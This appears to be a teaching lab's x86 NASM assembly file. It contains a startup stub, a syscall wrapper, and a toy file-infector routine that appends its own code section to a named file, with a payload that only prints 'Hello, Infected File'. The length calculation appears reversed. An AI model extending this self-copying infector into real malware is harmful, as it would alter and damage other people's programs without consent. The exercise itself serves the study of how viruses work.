section .text
global _start
global system_call
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop

system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; ###########################################################################

code_start:

global infection
global infector
extern print
extern printInt

section	.rodata
Text:
	DB	"Hello, Infected File", 10, 0	;  string
Err_Text:
	DB 	"I H4Z ERR", 10, 0

; prints to the screen the message "Hello, Infected File".
infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, 4    	 	; arg1 = sys_write=4
    mov     ebx, 1   		; arg2 = file=stdout=1
    mov     ecx, Text   	; arg3 = pointer to text
    mov     edx, 22   		; arg4 = text size
    int     0x80            ; Transfer control to operating system

    popad                   ; Restore caller state (registers)
    ;mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

; opens the file named in its argument,
; and adds the executable code from "code_start" to "code_end"
; after the end of that file, and closes the file
infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    ;open:
    mov     eax, 5		;sys open
    mov     ebx, [ebp+8]    	; Copy function args to registers: leftmost...(file path)
    mov     ecx, 1025		; o_append | o_wr
    mov     edx, 0777		; permission

    int     0x80            	; call OS
    cmp eax, -1			;  check returned value...
    jl err

    mov     ebx, eax    	; Save returned value... (file desc)

    ;calc_length:
    mov ecx, code_start
    mov edx, code_end
    sub ecx, edx
    mov edx, ecx

    ;write
    mov     eax, 4		; sys write
    mov     ecx, code_start     ; pointer to buffer
    int     0x80		; call OS

    cmp eax, 0			;  check returned value...
    jl err
    jmp close

    err:
    mov  eax, Err_Text
    push eax
    call print
    pop eax

    close:
    mov     eax, 6		; sys close
    int     0x80

    return:
    popad                   ; Restore caller state (registers)
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:
